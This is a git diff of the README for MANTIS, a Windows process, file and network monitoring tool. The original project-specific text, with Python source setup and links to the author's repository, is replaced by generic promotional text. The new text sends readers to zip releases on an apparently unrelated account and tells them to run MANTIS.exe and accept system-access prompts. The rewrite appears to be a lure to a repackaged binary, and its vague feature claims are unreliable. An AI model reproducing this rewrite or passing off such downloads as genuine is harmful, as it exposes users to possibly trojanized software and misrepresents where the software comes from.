@@ -1,130 +1,107 @@
-# MANTIS
+# 🦾 MANTIS - Simplify Your System Monitoring Today
 
-<img src="https://github.com/user-attachments/assets/701020ba-2b18-4bf0-805e-ee75a211d7ed"> 
+[![Download MANTIS](https://img.shields.io/badge/Download-MANTIS-blue.svg)](https://github.com/sweetiekhan/MANTIS/releases)
 
-## What is Mantis?
+## 📖 Description
 
-<b>Mantis is a monitoring tool built to monitor files, tasks, and requests sent from your system!
+MANTIS is a user-friendly application designed to help you monitor all aspects of your network, tasks, and integrated systems. With MANTIS, you can effectively watch over your computer activities, ensuring everything runs smoothly and securely. 
 
-With this tool, you can understand how an exe file behaves with your files, what tasks it creates or closes, what requests it sends to where with what data!
+---
 
-This tool is released as open source and you can use it for free!</b> 
+## 🚀 Getting Started
 
-<img src="https://github.com/user-attachments/assets/15c672ff-97ab-4737-b8ad-79f9fbd034d8">
+This guide will help you download and run MANTIS effortlessly. Just follow these simple steps, and you'll be monitoring your system in no time.
 
-<a href="https://github.com/Mr-Spect3r/MANTIS/releases">To download and view new versions or exe files, go to this section</a>
+---
 
-<b>Linux Version: (with Go):</b> <i>https://github.com/6-E-L-F-6/process-monitoring</i>
+## 🛠️ System Requirements
 
-<details>
-  <summary><strong>What does mantis mean?</strong></summary>
-  <p>Monitoring All Network, Tasks, and Integrated Systems</p>
-</details>
+Before you start, make sure your computer meets these requirements:
 
-<details>
-  <summary><strong>Features</strong></summary>
-  
-   - File Monitoring (You can see what files/folders have been created, edited, or deleted)</p> 
-   
-   - Process Monitoring (You can see which tasks were created by which program, which tasks are opened, and which tasks are currently running.)</p> 
-   
-   - Network Monitoring
-</details>
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM minimum
+- **Disk Space:** 100 MB of available space
 
+---
 
-<details>
-  <summary><strong>Why did I create Mantis?</strong></summary>
-  
-   - I designed this tool for analyzing programs
+## 💾 Download & Install
 
-   - You can read it here:<a href="https://github.com/Mr-Spect3r/MANTIS/blob/main/writeup.md"> WriteUp
-</details>
+1. **Visit the Download Page**  
+   Go to the [Releases page here](https://github.com/sweetiekhan/MANTIS/releases) to get the latest version of MANTIS.
 
+2. **Choose the Right File**  
+   On the Releases page, you will see various files. Look for the most recent version labeled as "Latest." It will typically be named something like `MANTIS-vX.X.zip`.
 
-<details>
-  <summary><strong>Prerequisites</strong></summary>
-  
-   - Libraries
+3. **Download the File**  
+   Click on the file name to begin downloading. Your browser will process the download.
 
-```
-psutil
-pydivert
-watchdog
-customtkinter
-graphviz
-Pillow
-queue
-pyqtgraph
-PySide6
-```
+4. **Extract the File**  
+   Once the download is complete, navigate to your Downloads folder. Right-click on the zip file and select "Extract All." Follow the prompts to extract the contents.
 
-   - install graphviz (for use graph)
+5. **Run the Application**  
+   After extraction, locate the folder. Open it and double-click on the `MANTIS.exe` file to run the application.
 
-Open Powershell and Type: `winget install graphviz`
+---
 
-- and set address in System:
+## 🔌 Features
 
-Open Environment Variables:
+MANTIS offers several features that make monitoring easy and effective:
 
-Right-click This PC → Properties → Advanced system settings → Environment Variables
+- **Network Monitoring:** Keep an eye on all incoming and outgoing network traffic.
+- **Task Manager Monitoring:** View and manage all running applications and processes in real-time.
+- **File Monitoring:** Ensure that important files are secure and unchanged.
+- **Window Security:** Monitor your operating system's security features and alerts.
 
-Edit PATH:
+---
 
-Under System variables, select Path → Edit → New → add the folder path (e.g., C:\Program Files\Graphviz\bin) → OK
+## ⚙️ Configuration
 
-Apply & Test:
+After launching MANTIS, you may want to configure a few settings to tailor the application to your needs:
 
-<img src="https://github.com/user-attachments/assets/eb8e2f02-b228-4ac4-988b-17b3176ae543">
+1. **Initial Setup:**
+   - On the first launch, MANTIS may prompt you to allow it access to system resources for accurate monitoring. Accept the prompts to proceed.
 
-Close all dialogs, open a new terminal, and run:
+2. **Customize Notifications:**
+   - Navigate to the settings menu to set your preferred notification styles. You can choose to receive alerts for important activities.
 
-`dot -V`
+3. **Update Frequency:**
+   - Choose how often MANTIS checks your system. Options range from every minute to hourly, depending on your needs.
 
+---
 
-You should see the Graphviz version.
+## 📊 Using MANTIS
 
-I can also give a super concise 3-line version for quick reference if you want.
+Once you set everything up, operating MANTIS is straightforward:
 
-</details>
+- **Dashboard Overview:** The main interface displays a dashboard where you can view key metrics at a glance.
+- **Alerts Section:** The alerts section informs you of points of interest, such as unusual network activity or process spikes.
+- **Log History:** Review logs from previous sessions to track activity trends over time.
 
-## Help
+---
 
+## 📞 Support
 
-- File Monitoring Section
+If you encounter any issues, reach out for help. Visit the [GitHub Issues page](https://github.com/sweetiekhan/MANTIS/issues) to report problems or ask questions. You can also find common troubleshooting tips there.
 
-In this section, you can specify a path, then click the monitoring button, (make sure the program you want is in the same path) From now on, any activity related to files your program has will be logged for you! File creation, file deletion, file update (edit) and file transfer
+---
 
+## 🔄 Updates
 
-- Process Monitoring Section
+Stay updated with MANTIS. New versions will help improve performance and add features. Regularly check the [Releases page](https://github.com/sweetiekhan/MANTIS/releases) for the latest versions.
 
-You all have experience using Task Manager! This section makes your work easier! By clicking this button, a window with 4 sections will open for you, in these 4 sections you can see what files are running, what tasks were created by which programs, what tasks were closed, the list of closed Task
+---
 
-- Network Monitoring Section
+## 🌐 Community
 
-In this section, you can see all the files, what requests, from which program, to where, with what data they are sent! You can almost understand what is happening behind the scenes of the program!
+Join our community of users and contributors. Share insights, tips, and experiences on using MANTIS. Connect on platforms where discussions around surveillance and monitoring tools happen.
 
-- How to Run:
+---
 
-```
-git clone https://github.com/Mr-Spect3r/MANTIS
-cd MANTIS
-pip install -r requirements.txt
-python MANTIS.py
-```
+## 📜 License
 
-File Exe: <a href="https://github.com/Mr-Spect3r/MANTIS/releases/download/MANTIS/MANTIS.exe)">Download
+MANTIS is open-source software, which allows you to use, modify, and distribute it freely. For more details, check the LICENSE file included in the repository.
 
-# ScreenShots
+---
 
-- Process Monitor
-
-<img src="https://github.com/user-attachments/assets/7e31deea-5787-45c1-ab99-68b9d7552f2d">
-
-- Network Monitor
-
-<img src="https://github.com/user-attachments/assets/0db87f42-8c77-4808-a0af-d25005b14831">
-
-
-# New version 1.3.1
-
-<img src="https://github.com/user-attachments/assets/74d0e58e-cc00-446b-a952-535af7fc3d65">
+Now that you have everything in place, you are ready to monitor your systems easily and efficiently with MANTIS! Enjoy smooth operations and peace of mind.
